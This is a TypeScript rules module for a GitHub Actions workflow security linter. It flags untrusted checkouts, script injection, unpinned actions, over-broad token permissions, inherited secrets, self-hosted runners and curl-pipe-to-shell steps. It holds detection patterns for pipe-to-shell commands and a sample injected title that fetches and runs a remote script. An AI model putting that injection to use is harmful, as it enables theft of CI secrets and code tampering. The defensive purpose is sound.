/**
 * The checks. Each rule looks at one workflow and returns findings with a `key` that stays the same when lines
 * move, so a pull request can be judged by what it adds (see newFindings in analyze.ts).
 */
import type { Config } from "./config.js";
import type { Job, Permissions, Step, Workflow } from "./workflow.js";

export const SEVERITIES = ["critical", "high", "medium", "low"] as const;
export type Severity = (typeof SEVERITIES)[number];

export const RULE_IDS = [
  "untrusted-checkout",
  "script-injection",
  "unpinned-action",
  "excessive-permissions",
  "missing-permissions",
  "secrets-inherit",
  "self-hosted-runner",
  "curl-pipe-shell",
] as const;
export type RuleId = (typeof RULE_IDS)[number];

export interface Finding {
  rule: RuleId;
  severity: Severity;
  line: number;
  job?: string;
  message: string;
  /** Identity for comparing two versions of a file – no line numbers in it. */
  key: string;
}

export interface Context {
  config: Config;
  /** Self-hosted runners on pull request triggers only matter where anyone can open a pull request. */
  publicRepo: boolean;
}

type Rule = (workflow: Workflow, context: Context) => Finding[];

const PR_TARGET_TRIGGERS = ["pull_request_target", "workflow_run"];
/** Write access here reaches code, releases, packages or other workflows – the rest is narrower. */
const BROAD_SCOPES = ["contents", "actions", "packages", "deployments"];
const FORK_TRIGGERS = ["pull_request", "pull_request_target"];

// Values an outsider can choose, from GitHub's "Security hardening for GitHub Actions" guide.
const UNTRUSTED_CONTEXTS: RegExp[] = [
  /github\.event\.(issue|pull_request|discussion)\.(title|body)\b/,
  /github\.event\.(comment|review|review_comment)\.body\b/,
  /github\.event\.pages(\[[^\]]*\]|\.\*)?\.page_name\b/,
  /github\.event\.commits(\[[^\]]*\]|\.\*)?\.(message|author\.(email|name))\b/,
  /github\.event\.head_commit\.(message|author\.(email|name))\b/,
  /github\.event\.pull_request\.head\.(ref|label|repo\.default_branch)\b/,
  /github\.event\.workflow_run\.(head_branch|display_title|head_commit\.(message|author\.(email|name)))\b/,
  /github\.head_ref\b/,
];
const PR_HEAD_REF =
  /github\.event\.(pull_request\.head\.(sha|ref)|workflow_run\.head_(sha|branch))|github\.head_ref/;
const EXPRESSION = /\$\{\{([\s\S]*?)\}\}/g;
const FULL_SHA = /^[0-9a-f]{40}$/;
const PIPE_TO_SHELL = /\b(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(ba|z|da)?sh\b/;

const untrustedCheckout: Rule = (wf) => {
  const trigger = wf.triggers.find((t) => PR_TARGET_TRIGGERS.includes(t));
  if (!trigger) return [];
  return eachStep(wf, (job, step) =>
    step.uses?.startsWith("actions/checkout@") && PR_HEAD_REF.test(step.with.ref ?? "")
      ? [
          finding("untrusted-checkout", "critical", step.line, job, `${job.id}`, [
            `\`${trigger}\` runs with a write token and the repository's secrets, and this step checks out`,
            "the pull request's code. Anything that code runs next – a build, a test, an install script – can",
            'steal them (a "pwn request"). Use `pull_request` for untrusted code, or keep this job away from',
            "the checked-out code.",
          ]),
        ]
      : [],
  );
};

const scriptInjection: Rule = (wf) =>
  eachStep(wf, (job, step) => {
    const script =
      step.run ?? (step.uses?.startsWith("actions/github-script@") ? step.with.script : undefined);
    if (!script) return [];
    const seen = new Set<string>();
    const found: Finding[] = [];
    for (const [, expression] of script.matchAll(EXPRESSION)) {
      for (const pattern of UNTRUSTED_CONTEXTS) {
        const context = expression!.match(pattern)?.[0];
        if (!context || seen.has(context)) continue;
        seen.add(context);
        found.push(
          finding("script-injection", "high", step.line, job, `${job.id}|${context}`, [
            `\`${context}\` is set by whoever opens the issue, pull request or comment, and it is pasted into`,
            'the script before it runs – a title like `"; curl evil.sh | sh #` becomes code. Pass it through',
            '`env:` and use the variable (`"$TITLE"`) instead.',
          ]),
        );
      }
    }
    return found;
  });

const unpinnedAction: Rule = (wf, { config }) => {
  const check = (uses: string | undefined, line: number, job: Job): Finding[] => {
    if (!uses || uses.startsWith("./") || isPinned(uses) || isAllowed(uses, config.allowUnpinned)) return [];
    return [
      finding("unpinned-action", "medium", line, job, `${job.id}|${uses}`, [
        `\`${uses}\` points to a tag or branch its owner can move at any time; whatever it points to then`,
        "runs with this job's token and secrets. Pin it to a full commit SHA (a comment can keep the",
        "version readable: `@<sha> # v2.1.0`).",
      ]),
    ];
  };
  return wf.jobs.flatMap((job) => [
    ...check(job.uses, job.usesLine, job),
    ...job.steps.flatMap((step) => check(step.uses, step.line, job)),
  ]);
};

const excessivePermissions: Rule = (wf) => {
  const check = (perms: Permissions | undefined, owner: string, job?: Job): Finding[] => {
    if (!perms) return [];
    if (perms.shorthand === "write-all") {
      return [
        finding("excessive-permissions", "high", perms.line, job, `${owner}|write-all`, [
          "`write-all` gives the token write access to everything – code, releases, packages, settings of",
          "workflows. List only the scopes this needs, e.g. `contents: read`.",
        ]),
      ];
    }
    const who = `every step${job ? ` of \`${job.id}\`` : ""}`;
    return perms.scopes
      .filter((s) => s.level === "write")
      .map((s) =>
        s.scope === "id-token"
          ? finding("excessive-permissions", "low", s.line, job, `${owner}|${s.scope}`, [
              `\`id-token: write\` lets ${who} request an OIDC token that cloud providers and registries`,
              "(AWS, Azure, PyPI, npm) accept as this workflow. Right for trusted publishing – give it only to",
              "the job that signs in.",
            ])
          : finding(
              "excessive-permissions",
              BROAD_SCOPES.includes(s.scope) ? "medium" : "low",
              s.line,
              job,
              `${owner}|${s.scope}`,
              [
                `\`${s.scope}: write\` lets ${who} change ${s.scope.replace(/-/g, " ")}. Fine when a step needs it`,
                "– otherwise `read` is enough, and a compromised action can do far less.",
              ],
            ),
      );
  };
  return [
    ...check(wf.permissions, "workflow"),
    ...wf.jobs.flatMap((job) => check(job.permissions, job.id, job)),
  ];
};

const missingPermissions: Rule = (wf) =>
  wf.permissions
    ? []
    : wf.jobs
        .filter((job) => !job.permissions && !job.uses)
        .map((job) =>
          finding("missing-permissions", "low", job.line, job, job.id, [
            `\`${job.id}\` has no \`permissions:\`, so its token gets the repository's default – which can be`,
            "write access to everything. Add `permissions: contents: read` (or `{}`) at the top of the file.",
          ]),
        );

const secretsInherit: Rule = (wf) =>
  wf.jobs
    .filter((job) => job.secretsInheritLine !== undefined)
    .map((job) =>
      finding("secrets-inherit", "medium", job.secretsInheritLine!, job, job.id, [
        "`secrets: inherit` hands every secret of this repository to the called workflow. Pass only the ones",
        "it uses (`secrets: { token: ${{ secrets.DEPLOY_TOKEN }} }`).",
      ]),
    );

const selfHostedRunner: Rule = (wf, { publicRepo }) => {
  if (!publicRepo || !wf.triggers.some((t) => FORK_TRIGGERS.includes(t))) return [];
  return wf.jobs
    .filter((job) => job.runsOn.includes("self-hosted"))
    .map((job) =>
      finding("self-hosted-runner", "high", job.runsOnLine, job, job.id, [
        "In a public repository anyone can open a pull request, and this job runs its code on your own",
        "machine – which usually keeps state between jobs and can reach your network. Use GitHub-hosted",
        "runners for pull requests.",
      ]),
    );
};

const curlPipeShell: Rule = (wf) =>
  eachStep(wf, (job, step) => {
    const match = step.run?.match(PIPE_TO_SHELL)?.[0];
    return match
      ? [
          finding("curl-pipe-shell", "low", step.line, job, `${job.id}|${match}`, [
            "Piping a download straight into a shell runs whatever that server sends today. Download a pinned",
            "version, check its checksum, then run it.",
          ]),
        ]
      : [];
  });

export const RULES: Record<RuleId, Rule> = {
  "untrusted-checkout": untrustedCheckout,
  "script-injection": scriptInjection,
  "unpinned-action": unpinnedAction,
  "excessive-permissions": excessivePermissions,
  "missing-permissions": missingPermissions,
  "secrets-inherit": secretsInherit,
  "self-hosted-runner": selfHostedRunner,
  "curl-pipe-shell": curlPipeShell,
};

function eachStep(wf: Workflow, fn: (job: Job, step: Step) => Finding[]): Finding[] {
  return wf.jobs.flatMap((job) => job.steps.flatMap((step) => fn(job, step)));
}

function finding(
  rule: RuleId,
  severity: Severity,
  line: number,
  job: Job | undefined,
  key: string,
  message: string[],
): Finding {
  return { rule, severity, line, job: job?.id, message: message.join(" "), key: `${rule}|${key}` };
}

function isPinned(uses: string): boolean {
  if (uses.startsWith("docker://")) return /@sha256:[0-9a-f]{64}$/.test(uses);
  const ref = uses.split("@")[1];
  return ref !== undefined && FULL_SHA.test(ref);
}

function isAllowed(uses: string, patterns: string[]): boolean {
  if (uses.startsWith("docker://")) return false;
  const [owner, repo] = uses.split("@")[0]!.split("/");
  return patterns.some((p) => p === `${owner}/*` || p === `${owner}/${repo}`);
}
